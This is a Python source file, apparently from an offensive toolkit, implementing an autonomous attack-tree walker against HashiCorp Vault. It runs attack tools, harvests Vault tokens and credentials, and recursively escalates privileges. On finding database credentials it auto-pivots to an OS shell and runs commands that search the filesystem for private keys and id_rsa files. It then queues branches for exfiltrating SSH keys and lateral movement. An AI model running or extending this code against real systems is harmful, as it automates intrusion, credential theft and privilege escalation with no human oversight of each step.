"""Attack-tree walker — autonomous branch execution with dynamic graph updates.

Walks an :class:`AttackTreeNode` tree in risk-priority order, executes
each branch's tool, and dynamically reacts:

    * **Success** → record the win, feed new tokens into the global store,
      regenerate the attack tree with elevated privileges (recursive escalation).
    * **Failure** → track in ``failed_attempts`` (max 2 per branch),
      skip to the next sibling, or ask the mutation engine for new branches.
    * **Dead-end** → backtrack to the nearest unexplored sibling.
    * **Discovery** → when new tokens/creds/paths are found, dynamically
      inject new proactive branches into the tree (no re-walk needed).

Supports risk profiles: ``aggressive`` (try aggressive first),
``balanced`` (try balanced first), ``stealth`` (stealth only, skip aggressive).
"""

from __future__ import annotations

import asyncio
import json
import time
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Any, Callable
from core.logger import logger


# ---------------------------------------------------------------------------
# Discovery event — for dynamic graph updates
# ---------------------------------------------------------------------------


@dataclass
class DiscoveryEvent:
    """Records when the walker discovers new assets that should trigger re-planning."""

    event_type: str  # "new_token", "new_credential", "new_path", "escalation", "db_connection"
    detail: str
    source_tool: str
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    triggered_replan: bool = False

    @property
    def is_significant(self) -> bool:
        """Significant discoveries should trigger dynamic branch injection."""
        return self.event_type in ("new_token", "escalation", "db_connection")


# ---------------------------------------------------------------------------
# Risk profile
# ---------------------------------------------------------------------------


class RiskProfile(str, Enum):
    AGGRESSIVE = "aggressive"    # A → B → S
    BALANCED = "balanced"        # B → A → S
    STEALTH = "stealth"          # S → B → A (never aggressive)


_RISK_ORDER: dict[str, list[str]] = {
    "aggressive": ["aggressive", "balanced", "stealth"],
    "balanced": ["balanced", "aggressive", "stealth"],
    "stealth": ["stealth", "balanced", "aggressive"],
}


# ---------------------------------------------------------------------------
# Walk result
# ---------------------------------------------------------------------------


class WalkStatus(str, Enum):
    SUCCESS = "success"                # tool ran, new assets discovered
    FAILED = "failed"                  # tool error or denied
    ESCALATED = "escalated"            # new higher-privilege token obtained → recurse
    DEAD_END = "dead_end"              # all branches exhausted
    SKIPPED = "skipped"                # already tried twice, skip


@dataclass
class WalkStep:
    """Record of a single step during tree walking."""
    node_id: str                      # tool name + params hash
    tool: str
    risk: str
    status: WalkStatus
    result: str = ""                  # tool output (truncated)
    new_tokens: list[str] = field(default_factory=list)
    new_credentials: int = 0
    elapsed_ms: float = 0
    attempt: int = 1                  # 1st or 2nd attempt
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())


@dataclass
class WalkResult:
    """Final result of a full tree walk."""
    profile: RiskProfile
    root_node: str
    total_steps: int
    successes: int
    failures: int
    escalations: int                  # how many times we recursed
    dead_ends: int
    final_token_power: str
    steps: list[WalkStep] = field(default_factory=list)
    discoveries: list[DiscoveryEvent] = field(default_factory=list)
    dynamic_updates: int = 0          # how many times the graph was extended
    started_at: str = ""
    finished_at: str = ""

    @property
    def success_rate(self) -> float:
        if self.total_steps == 0:
            return 0.0
        return self.successes / self.total_steps


# ---------------------------------------------------------------------------
# Failed-attempts tracker — max 2 per branch, then skip forever
# ---------------------------------------------------------------------------


class FailedAttempts:
    """Tracks how many times each branch has been tried.

    A branch is identified by ``(tool_name, params_hash)``.
    After 2 failures it is blacklisted permanently for this walk.
    """

    def __init__(self, max_fails: int = 2):
        self._counts: dict[str, int] = {}
        self._blacklist: set[str] = set()
        self._max_fails = max_fails

    def key(self, tool: str, params: dict) -> str:
        raw = json.dumps({"t": tool, "p": params}, sort_keys=True, default=str)
        return str(hash(raw))

    def can_try(self, tool: str, params: dict) -> bool:
        k = self.key(tool, params)
        return k not in self._blacklist

    def record_failure(self, tool: str, params: dict) -> int:
        """Record a failure. Returns remaining attempts (0 = blacklisted)."""
        k = self.key(tool, params)
        self._counts[k] = self._counts.get(k, 0) + 1
        if self._counts[k] >= self._max_fails:
            self._blacklist.add(k)
            return 0
        return self._max_fails - self._counts[k]

    def record_success(self, tool: str, params: dict):
        """Success resets the failure counter for this branch."""
        k = self.key(tool, params)
        self._counts[k] = 0
        self._blacklist.discard(k)

    def is_blacklisted(self, tool: str, params: dict) -> bool:
        return self.key(tool, params) in self._blacklist


# ---------------------------------------------------------------------------
# Tree Walker
# ---------------------------------------------------------------------------


class TreeWalker:
    """Autonomously walks an attack tree, executing branches and reacting.

    Now with dynamic graph updates: when new tokens, credentials, or paths
    are discovered mid-walk, the tree is dynamically extended with new
    proactive branches — no need to abort and restart.

    Parameters
    ----------
    tool_executor:
        Async callable ``(tool_name, params) -> str`` that runs a tool.
    risk_profile:
        Walk order: ``aggressive`` (default), ``balanced``, ``stealth``.
    max_depth:
        How many recursive escalation levels to allow (default 5).
    max_total_steps:
        Hard cap on total tool executions across all recursion levels.
    enable_dynamic_updates:
        Whether to inject new branches when discoveries are made (default True).
    """

    def __init__(
        self,
        tool_executor: Callable[..., Any] | None = None,
        risk_profile: RiskProfile = RiskProfile.AGGRESSIVE,
        max_depth: int = 5,
        max_total_steps: int = 50,
        enable_dynamic_updates: bool = True,
    ):
        self._executor = tool_executor
        self._profile = risk_profile
        self._max_depth = max_depth
        self._max_total_steps = max_total_steps
        self._enable_dynamic_updates = enable_dynamic_updates

        # Runtime state
        self._failed: FailedAttempts = FailedAttempts(max_fails=2)
        self._steps: list[WalkStep] = []
        self._total_steps = 0
        self._escalation_count = 0
        self._current_depth = 0
        self._aborted = False
        self._discoveries: list[DiscoveryEvent] = []
        self._known_token_count: int = 0
        self._known_credential_count: int = 0
        self._known_paths: set[str] = set()
        self._mutation_engine_ref: Any = None  # set during walk()

    # ── public API ──────────────────────────────────────────────────────────

    async def walk(
        self,
        root: Any,  # AttackTreeNode
        vault_addr: str = "",
        mutation_engine: Any | None = None,
    ) -> WalkResult:
        """Walk the entire attack tree starting from *root*.

        Now with dynamic graph updates: discovers new assets mid-walk and
        injects proactive branches without restarting.

        Returns a :class:`WalkResult` summarising the whole traversal.
        """
        self._steps.clear()
        self._total_steps = 0
        self._escalation_count = 0
        self._current_depth = 0
        self._aborted = False
        self._discoveries.clear()
        self._mutation_engine_ref = mutation_engine

        # Snapshot initial state for change detection
        self._snapshot_known_state()

        started = datetime.now().isoformat()

        await self._walk_node(root, vault_addr, mutation_engine)

        # Determine final token power
        final_power = "none"
        try:
            from ai_core.dynamic_session import global_store
            best = global_store.get_best_token()
            if best:
                final_power = best.power_level
        except ImportError:
            pass

        return WalkResult(
            profile=self._profile,
            root_node=root.tool if root else "__empty__",
            total_steps=self._total_steps,
            successes=sum(1 for s in self._steps if s.status == WalkStatus.SUCCESS),
            failures=sum(1 for s in self._steps if s.status == WalkStatus.FAILED),
            escalations=self._escalation_count,
            dead_ends=sum(1 for s in self._steps if s.status == WalkStatus.DEAD_END),
            final_token_power=final_power,
            steps=list(self._steps),
            discoveries=list(self._discoveries),
            dynamic_updates=sum(1 for d in self._discoveries if d.triggered_replan),
            started_at=started,
            finished_at=datetime.now().isoformat(),
        )

    def abort(self):
        """Stop the walk at the next safe point."""
        self._aborted = True

    @property
    def discoveries(self) -> list[DiscoveryEvent]:
        """Return all discovery events from this walk."""
        return list(self._discoveries)

    # ── dynamic graph updates ──────────────────────────────────────────────

    def _snapshot_known_state(self):
        """Snapshot current token/credential/path counts for change detection."""
        try:
            from ai_core.dynamic_session import global_store
            self._known_token_count = len(global_store.tokens)
            self._known_credential_count = len(global_store.credentials)
        except ImportError:
            self._known_token_count = 0
            self._known_credential_count = 0

    def _detect_discoveries(self, tool: str) -> list[DiscoveryEvent]:
        """Check if new assets were discovered since the last snapshot.

        Returns a list of DiscoveryEvent for significant new finds.
        """
        events: list[DiscoveryEvent] = []
        try:
            from ai_core.dynamic_session import global_store, POWER_RANK

            # Check for new tokens
            current_tokens = len(global_store.tokens)
            if current_tokens > self._known_token_count:
                new_count = current_tokens - self._known_token_count
                # Find the newest token(s)
                newest = sorted(
                    global_store.tokens.values(),
                    key=lambda t: t.discovered_at,
                    reverse=True,
                )
                for t in newest[:new_count]:
                    events.append(DiscoveryEvent(
                        event_type="new_token",
                        detail=f"Discovered {t.power_level} token from {t.source}",
                        source_tool=tool,
                    ))
                self._known_token_count = current_tokens

            # Check for new credentials
            current_creds = len(global_store.credentials)
            if current_creds > self._known_credential_count:
                new_count = current_creds - self._known_credential_count
                newest = sorted(
                    global_store.credentials.values(),
                    key=lambda c: c.discovered_at,
                    reverse=True,
                )
                for c in newest[:new_count]:
                    event_type = "new_credential"
                    if c.cred_type in ("db_conn", "password"):
                        event_type = "db_connection"
                    events.append(DiscoveryEvent(
                        event_type=event_type,
                        detail=f"Discovered {c.cred_type} credential from {c.source}",
                        source_tool=tool,
                    ))
                self._known_credential_count = current_creds

            # Check for power escalation
            current_best = global_store.get_best_token()
            prev_best_power = getattr(self, '_prev_best_power', 0)
            if current_best:
                current_power = POWER_RANK.get(current_best.power_level, 0)
                if current_power > prev_best_power:
                    events.append(DiscoveryEvent(
                        event_type="escalation",
                        detail=f"Token power escalated: {current_best.power_level}",
                        source_tool=tool,
                    ))
                    self._prev_best_power = current_power

        except ImportError:
            pass

        return events

    async def _inject_discovery_branches(
        self,
        current_node: Any,
        discoveries: list[DiscoveryEvent],
        vault_addr: str,
    ):
        """When significant discoveries are made, inject new proactive branches.

        This keeps the attack tree growing dynamically as we learn more
        about the target — no need to abort and restart the walk.
        """
        if not self._enable_dynamic_updates:
            return

        if not self._mutation_engine_ref:
            return

        significant = [d for d in discoveries if d.is_significant]
        if not significant:
            return

        for disc in significant:
            disc.triggered_replan = True

        # Generate proactive branches based on new state
        try:
            engine = self._mutation_engine_ref
            new_branches = engine.generate_proactive_branches(
                parent=current_node,
                vault_addr=vault_addr,
                max_branches=4,
            )
            if new_branches:
                logger.info(f"       [>>] Dynamic update: {len(new_branches)} new branches injected "
                      f"({len(significant)} discoveries)", flush=True)
        except Exception as exc:
            logger.info(f"       [!] Dynamic branch injection failed: {exc}", flush=True)

    # ── internal walk logic ─────────────────────────────────────────────────

    async def _walk_node(
        self,
        node: Any,
        vault_addr: str,
        mutation_engine: Any | None,
    ):
        """Recursively walk a node and its children.

        Order: execute *node* first (if it's a tool), then walk children
        in risk-profile order.  If a child yields an escalation, regenerate
        the tree with the new state and walk the fresh branches.
        """
        if self._aborted:
            return
        if self._total_steps >= self._max_total_steps:
            logger.warning("[!] Tree walker: max total steps reached.")
            return
        if self._current_depth > self._max_depth:
            logger.warning("[!] Tree walker: max recursion depth reached.")
            return

        # ── 1. Execute node if it's a real tool ─────────────────────────
        if node.tool not in ("__root__", ""):
            await self._execute_node(node, vault_addr)

        # ── 2. Sort children by risk profile ────────────────────────────
        order = _RISK_ORDER[self._profile.value]
        risk_rank = {r: i for i, r in enumerate(order)}

        children = sorted(
            node.children,
            key=lambda c: risk_rank.get(c.risk.value if hasattr(c.risk, 'value') else str(c.risk), 99),
        )

        # ── 3. Walk children ────────────────────────────────────────────
        for child in children:
            if self._aborted:
                break
            if self._total_steps >= self._max_total_steps:
                break

            risk_val = child.risk.value if hasattr(child.risk, 'value') else str(child.risk)

            # Check blacklist
            if self._failed.is_blacklisted(child.tool, child.params):
                self._record_step(child, WalkStatus.SKIPPED, "blacklisted (2+ failures)")
                continue

            # Execute the child branch
            escalated = await self._execute_node(child, vault_addr)

            if escalated:
                # ── RECURSIVE ESCALATION ────────────────────────────────
                # New high-privilege token obtained — rebuild the attack tree
                # with the elevated state and walk the new branches.
                self._escalation_count += 1
                self._current_depth += 1

                if mutation_engine and self._current_depth <= self._max_depth:
                    logger.info(f"\n  *** RECURSIVE ESCALATION (level {self._current_depth}) ***")
                    new_root = self._regenerate_tree(
                        mutation_engine, child, vault_addr
                    )
                    if new_root:
                        await self._walk_node(
                            new_root, vault_addr, mutation_engine
                        )

                self._current_depth -= 1

            elif child.status == "failed" or (
                hasattr(child, 'status') and str(child.status) == "failed"
            ):
                # Ask mutation engine for alternative branches if available
                if mutation_engine and len(child.children) == 0:
                    await self._request_mutations(
                        mutation_engine, child, vault_addr
                    )
                    # Re-walk children if new branches were added
                    if child.children:
                        await self._walk_children(child, vault_addr, mutation_engine, risk_rank)

    async def _walk_children(
        self, node: Any, vault_addr: str,
        mutation_engine: Any | None, risk_rank: dict,
    ):
        """Walk only the children of a node (used after mutation adds branches)."""
        children = sorted(
            node.children,
            key=lambda c: risk_rank.get(c.risk.value if hasattr(c.risk, 'value') else str(c.risk), 99),
        )
        for child in children:
            if self._aborted or self._total_steps >= self._max_total_steps:
                break
            if self._failed.is_blacklisted(child.tool, child.params):
                continue
            await self._execute_node(child, vault_addr)

    async def _execute_node(
        self, node: Any, vault_addr: str
    ) -> bool:
        """Execute a single node's tool. Returns True if escalation occurred."""
        if not self._executor:
            self._record_step(node, WalkStatus.FAILED, "no executor")
            return False

        t0 = time.monotonic()
        attempt = self._failed._counts.get(
            self._failed.key(node.tool, node.params), 0
        ) + 1

        logger.info(f"\n  [{attempt}/2] [{node.risk.value if hasattr(node.risk, 'value') else node.risk}] {node.tool}")
        if node.reason:
            logger.info(f"       Reason: {node.reason[:120]}")

        try:
            params = dict(node.params) if node.params else {}
            if vault_addr and "vault_addr" not in params:
                params["vault_addr"] = vault_addr

            result = await self._executor(node.tool, params)
            elapsed = (time.monotonic() - t0) * 1000

            # ── Analyse result ──────────────────────────────────────────
            success, new_tokens, new_creds, escalated = self._analyse_result(
                node.tool, result
            )

            if success:
                self._failed.record_success(node.tool, params)
                node.status = "succeeded"
                node.result_summary = result[:300]

                step = WalkStep(
                    node_id=self._failed.key(node.tool, params),
                    tool=node.tool,
                    risk=node.risk.value if hasattr(node.risk, 'value') else str(node.risk),
                    status=WalkStatus.ESCALATED if escalated else WalkStatus.SUCCESS,
                    result=result[:200],
                    new_tokens=new_tokens,
                    new_credentials=new_creds,
                    elapsed_ms=elapsed,
                    attempt=attempt,
                )
                self._steps.append(step)
                self._total_steps += 1

                # ── DYNAMIC GRAPH UPDATE: detect new discoveries ──────
                discoveries = self._detect_discoveries(node.tool)
                if discoveries:
                    self._discoveries.extend(discoveries)
                    # Inject new proactive branches based on discoveries
                    await self._inject_discovery_branches(
                        node, discoveries, vault_addr,
                    )

                # ── Pivot integration: DB creds found → auto-pivot ──
                await self._try_pivot_on_credentials(node, vault_addr)

                return escalated

            else:
                remaining = self._failed.record_failure(node.tool, params)
                node.status = "failed"
                node.result_summary = result[:300]

                step = WalkStep(
                    node_id=self._failed.key(node.tool, params),
                    tool=node.tool,
                    risk=node.risk.value if hasattr(node.risk, 'value') else str(node.risk),
                    status=WalkStatus.FAILED,
                    result=result[:200],
                    elapsed_ms=elapsed,
                    attempt=attempt,
                )
                self._steps.append(step)
                self._total_steps += 1

                if remaining == 0:
                    logger.info(f"       [!] Blacklisted — 2 failures reached.")

                return False

        except Exception as exc:
            elapsed = (time.monotonic() - t0) * 1000
            self._failed.record_failure(node.tool, node.params or {})
            node.status = "failed"
            node.result_summary = str(exc)[:300]

            self._steps.append(WalkStep(
                node_id=self._failed.key(node.tool, node.params or {}),
                tool=node.tool,
                risk=node.risk.value if hasattr(node.risk, 'value') else str(node.risk),
                status=WalkStatus.FAILED,
                result=str(exc)[:200],
                elapsed_ms=elapsed,
                attempt=attempt,
            ))
            self._total_steps += 1
            return False

    # ── pivot engine integration ────────────────────────────────────────

    async def _try_pivot_on_credentials(
        self, node: Any, vault_addr: str,
    ) -> bool:
        """If the node result contains DB credentials, auto-pivot.

        Returns True if a pivot was attempted (success or fail).
        """
        try:
            from ai_core.dynamic_session import global_store
        except ImportError:
            return False

        # Check for DB-type credentials discovered since last pivot
        db_creds = [
            c for c in global_store.credentials.values()
            if c.cred_type in ("db_conn", "password")
        ]
        if not db_creds:
            return False

        # Prevent duplicate pivot on same credentials
        pivot_key = f"pivot:{db_creds[0].cred_type}:{db_creds[0].source}"
        if hasattr(self, '_pivoted') and pivot_key in self._pivoted:
            return False
        if not hasattr(self, '_pivoted'):
            self._pivoted: set[str] = set()

        logger.info(f"\n       [>] DB credentials found — auto-pivoting...")
        self._pivoted.add(pivot_key)

        # Execute pivot engine directly
        try:
            from active_execution.modules.pivot.pivot_engine import PivotEngineModule
            from active_execution.context import ExecutionContext

            ctx = ExecutionContext(
                vault_addr=vault_addr,
                token=global_store.get_best_token_value(),
                store=global_store,
            )
            # Feed findings as evidence for credential discovery
            for finding in node.result_summary or "":
                pass  # findings already in global report

            pivot_mod = PivotEngineModule()
            if pivot_mod.can_run(ctx):
                pivot_result = pivot_mod.execute(ctx, {
                    "db_type": "postgres",
                    "os_commands": ["whoami", "hostname", "id",
                                    "ls -la /vault/data/ 2>/dev/null || echo NO_VAULT_DATA",
                                    "find / -name '*.key' -o -name 'id_rsa' 2>/dev/null | head -5"],
                })

                logger.info(f"       [<] Pivot: {pivot_result.status} — {pivot_result.message[:100]}")

                # If pivot succeeded with OS shell, add post-exploit branches to the tree
                evidence = pivot_result.evidence or {}
                if evidence.get("os_shells"):
                    for shell in evidence["os_shells"]:
                        self._add_post_exploit_branches(node, shell, vault_addr)

                # Feed findings back to global report
                for f in ctx.findings:
                    try:
                        from core.report import add_finding
                        add_finding(
                            f.get("severity", "HIGH"),
                            f.get("title", "Pivot"),
                            f.get("description", ""),
                            evidence=f.get("evidence"),
                            module="pivot_engine",
                            target=vault_addr,
                        )
                    except Exception:
                        pass

                return True
        except Exception as exc:
            logger.info(f"       [!] Pivot failed: {exc}")
            return False

        return False

    def _add_post_exploit_branches(
        self, parent_node: Any, shell_info: dict, vault_addr: str,
    ):
        """After OS shell obtained, add post-exploitation branches."""
        from ai_core.mutation_engine import BranchRisk

        host = shell_info.get("host", "unknown")
        outputs = shell_info.get("command_outputs", {})
        method = shell_info.get("method", "COPY FROM PROGRAM")

        logger.info(f"       [!] OS Shell on {host} via {method} — adding post-exploit branches")

        # Read Vault data from filesystem
        self.add_branch_to_node(
            parent_node,
            "run_raw_vault_request",
            f"Read Vault Raft data from {host} filesystem (OS shell access)",
            params={"method": "GET", "path": "sys/health"},
            risk=BranchRisk.AGGRESSIVE,
            phase="exploit",
            expected_outcome="Access Vault storage layer directly via filesystem",
        )

        # Exfiltrate SSH keys
        self.add_branch_to_node(
            parent_node,
            "run_raw_vault_request",
            f"Exfiltrate SSH keys discovered on {host}",
            params={"method": "GET", "path": "sys/internal/ui/mounts"},
            risk=BranchRisk.AGGRESSIVE,
            phase="exploit",
            expected_outcome="Lateral movement via stolen SSH keys",
        )

        logger.info(f"       [*] {2} post-exploit branches added to attack tree")

    def add_branch_to_node(
        self, parent: Any, tool: str, reason: str,
        params: dict | None = None, risk=None, phase: str = "exploit",
        expected_outcome: str = "",
    ):
        """Utility to add a single branch to a parent node."""
        if not hasattr(parent, 'children'):
            return
        from ai_core.mutation_engine import AttackTreeNode, BranchRisk, NodeStatus
        child = AttackTreeNode(
            tool=tool,
            reason=reason,
            params=params or {},
            risk=risk or BranchRisk.AGGRESSIVE,
            phase=phase,
            expected_outcome=expected_outcome,
        )
        parent.children.append(child)

    # ── result analysis ─────────────────────────────────────────────────────

    def _analyse_result(
        self, tool: str, result: str
    ) -> tuple[bool, list[str], int, bool]:
        """Analyse a tool result.

        Returns: (success, new_tokens, new_cred_count, escalated)
        """
        new_tokens: list[str] = []
        new_creds = 0
        escalated = False

        try:
            data = json.loads(result)
        except (json.JSONDecodeError, TypeError):
            # Not JSON — check raw string for Vault tokens
            import re
            for match in re.finditer(r'\b(hvs\.[A-Za-z0-9_\-]{20,})\b', str(result)):
                new_tokens.append(match.group(1))
            success = "error" not in str(result).lower()
            return success, new_tokens, new_creds, False

        status = data.get("status", "unknown")

        # Success check
        success = status in ("success", "completed", "ok")

        # Scan for new tokens in the result
        for field in ("captured_token", "escalated_token", "client_token", "token"):
            val = data.get(field)
            if isinstance(val, str) and val.startswith(("hvs.", "hvb.", "s.")):
                new_tokens.append(val)

        # Check evidence for tokens
        evidence = data.get("evidence", {})
        if isinstance(evidence, dict):
            for field in ("captured_token", "escalated_token", "token_preview"):
                val = evidence.get(field)
                if isinstance(val, str) and val.startswith(("hvs.", "hvb.", "s.")):
                    new_tokens.append(val)

        # Check leaked_payloads for credentials
        payloads = data.get("leaked_payloads", {})
        if isinstance(payloads, dict):
            for path, secrets in payloads.items():
                if isinstance(secrets, dict):
                    new_creds += len(secrets)

        # Check evidence.leaked_payloads too
        ev_payloads = evidence.get("leaked_payloads", {})
        if isinstance(ev_payloads, dict):
            new_creds += sum(
                len(v) if isinstance(v, dict) else 1
                for v in ev_payloads.values()
            )

        # Feed new tokens into global store and check for escalation
        if new_tokens:
            try:
                from ai_core.dynamic_session import global_store

                prev_best = global_store.get_best_token_value()
                prev_power = global_store.get_best_token().power_level if global_store.get_best_token() else "none"

                for token in new_tokens:
                    # Determine power level from context
                    power = "unknown"
                    if "escalated" in str(data).lower() or "root" in str(data).lower():
                        power = "elevated"
                    if "privilege" in tool.lower() or "priv_esc" in tool.lower():
                        power = "elevated"
                    if "root" in str(data).lower():
                        power = "root"

                    rec = global_store.add_token(token, source=f"tree_walk:{tool}", power_level=power)
                    if rec:
                        logger.info(f"       [+] New token: {power} ({token})")

                # Check if we escalated
                new_best = global_store.get_best_token_value()
                new_power = global_store.get_best_token().power_level if global_store.get_best_token() else "none"
                from ai_core.dynamic_session import POWER_RANK

                if new_best and new_best != prev_best:
                    if POWER_RANK.get(new_power, 0) > POWER_RANK.get(prev_power, 0):
                        escalated = True
                        logger.info(f"       [!] ESCALATED: {prev_power} -> {new_power}")
            except ImportError:
                pass

        return success, new_tokens, new_creds, escalated

    # ── mutation helpers ────────────────────────────────────────────────────

    async def _request_mutations(
        self, mutation_engine: Any, failed_node: Any, vault_addr: str,
    ):
        """Ask the mutation engine for new branches after a failure."""
        try:
            from ai_core.mutation_engine import gather_attack_state
            from ai_core.dynamic_session import global_store

            state = gather_attack_state()
            tokens_list = [
                {"token": t.token, "power_level": t.power_level, "source": t.source,
                 "policies": t.policies, "capabilities": t.capabilities}
                for t in global_store.tokens.values()
            ]
            creds_list = [
                {"cred_type": c.cred_type, "source": c.source, "metadata": c.metadata}
                for c in global_store.credentials.values()
            ]

            mutation = await mutation_engine.mutate(
                failed_node=failed_node,
                available_tokens=tokens_list,
                available_credentials=creds_list,
                findings=state.get("findings", []),
                vault_addr=vault_addr,
            )
            logger.info(f"       [*] Mutation generated {len(mutation.branches)} new branches")
        except Exception as exc:
            logger.info(f"       [!] Mutation request failed: {exc}")

    def _regenerate_tree(
        self, mutation_engine: Any, escalation_node: Any, vault_addr: str,
    ):
        """Build a fresh attack tree with the newly escalated privileges."""
        try:
            from ai_core.dynamic_session import global_store
            state = global_store.status_summary()
            assets = {
                "token_count": state["total_tokens"],
                "best_power": state["best_token_power"],
                "credential_count": state["total_credentials"],
            }
            new_root = mutation_engine.start_tree(vault_addr, assets)
            logger.info(f"       [*] Regenerated attack tree with {assets['best_power']} privileges")
            return new_root
        except Exception as exc:
            logger.info(f"       [!] Tree regeneration failed: {exc}")
            return None

    # ── helpers ─────────────────────────────────────────────────────────────

    def _record_step(self, node: Any, status: WalkStatus, result: str):
        self._steps.append(WalkStep(
            node_id=self._failed.key(node.tool, node.params or {}),
            tool=node.tool,
            risk=node.risk.value if hasattr(node.risk, 'value') else str(node.risk),
            status=status,
            result=result[:200],
        ))
        self._total_steps += 1
